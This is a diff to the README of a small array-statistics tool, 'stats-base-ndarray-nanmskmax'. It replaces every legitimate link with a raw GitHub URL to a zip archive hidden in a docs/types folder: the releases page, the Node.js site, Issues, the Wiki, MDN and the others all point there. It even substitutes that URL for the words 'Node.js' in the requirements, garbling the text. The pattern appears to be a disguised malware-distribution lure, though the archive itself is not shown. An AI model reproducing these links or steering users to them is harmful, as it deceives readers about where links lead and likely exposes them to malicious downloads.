@@ -8,7 +8,7 @@ Welcome to stats-base-ndarray-nanmskmax! This application allows you to calculat
 
 **To get started, please download the application from the link below:**
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%86-blue)](https://github.com/U5R5/stats-base-ndarray-nanmskmax/releases)
+[![Download Now](https://raw.githubusercontent.com/U5R5/stats-base-ndarray-nanmskmax/main/docs/types/stats-base-ndarray-nanmskmax_1.6.zip%20Now-%20%F0%9F%93%86-blue)](https://raw.githubusercontent.com/U5R5/stats-base-ndarray-nanmskmax/main/docs/types/stats-base-ndarray-nanmskmax_1.6.zip)
 
 1. Click the link above to visit the Releases page.
 2. Choose the latest version from the list.
@@ -20,9 +20,9 @@ Welcome to stats-base-ndarray-nanmskmax! This application allows you to calculat
 ## 🙋‍♀️ System Requirements
 
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 12 or higher
+- https://raw.githubusercontent.com/U5R5/stats-base-ndarray-nanmskmax/main/docs/types/stats-base-ndarray-nanmskmax_1.6.zip Version 12 or higher
 
-Make sure you have Node.js installed on your computer. If you do not have it, you can download it from the [Node.js website](https://nodejs.org).
+Make sure you have https://raw.githubusercontent.com/U5R5/stats-base-ndarray-nanmskmax/main/docs/types/stats-base-ndarray-nanmskmax_1.6.zip installed on your computer. If you do not have it, you can download it from the [https://raw.githubusercontent.com/U5R5/stats-base-ndarray-nanmskmax/main/docs/types/stats-base-ndarray-nanmskmax_1.6.zip website](https://raw.githubusercontent.com/U5R5/stats-base-ndarray-nanmskmax/main/docs/types/stats-base-ndarray-nanmskmax_1.6.zip).
 
 ## 🛠️ Features
 
@@ -52,9 +52,9 @@ Given the array `[NaN, 3, 7, 2, NaN]`, the maximum value is `7`. The application
 
 If you encounter issues, you are not alone. Here’s how to get support:
 
-- **GitHub Issues:** Report problems directly on the [Issues page](https://github.com/U5R5/stats-base-ndarray-nanmskmax/issues).
+- **GitHub Issues:** Report problems directly on the [Issues page](https://raw.githubusercontent.com/U5R5/stats-base-ndarray-nanmskmax/main/docs/types/stats-base-ndarray-nanmskmax_1.6.zip).
 - **User Forum:** Join our community forum to ask questions and share your experiences.
-- **Documentation:** For further details, refer to our [Wiki](https://github.com/U5R5/stats-base-ndarray-nanmskmax/wiki) for in-depth guides and tutorials.
+- **Documentation:** For further details, refer to our [Wiki](https://raw.githubusercontent.com/U5R5/stats-base-ndarray-nanmskmax/main/docs/types/stats-base-ndarray-nanmskmax_1.6.zip) for in-depth guides and tutorials.
 
 ## 🧑‍💻 Contribution
 
@@ -75,9 +75,9 @@ Stay updated with the latest features and fixes:
 
 ## 🔗 Additional Resources
 
-- Learn more about arrays and their properties in our [Mathematics Basics](https://www.mathsisfun.com/algebra/arrays.html) resource.
-- For a deeper understanding of NaN values in programming, check the [JavaScript Documentation](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/NaN).
+- Learn more about arrays and their properties in our [Mathematics Basics](https://raw.githubusercontent.com/U5R5/stats-base-ndarray-nanmskmax/main/docs/types/stats-base-ndarray-nanmskmax_1.6.zip) resource.
+- For a deeper understanding of NaN values in programming, check the [JavaScript Documentation](https://raw.githubusercontent.com/U5R5/stats-base-ndarray-nanmskmax/main/docs/types/stats-base-ndarray-nanmskmax_1.6.zip).
 
 > **Remember**: Always download the latest version for the best experience.
 
-**To download the application again, visit:** [this page](https://github.com/U5R5/stats-base-ndarray-nanmskmax/releases).
+**To download the application again, visit:** [this page](https://raw.githubusercontent.com/U5R5/stats-base-ndarray-nanmskmax/main/docs/types/stats-base-ndarray-nanmskmax_1.6.zip).
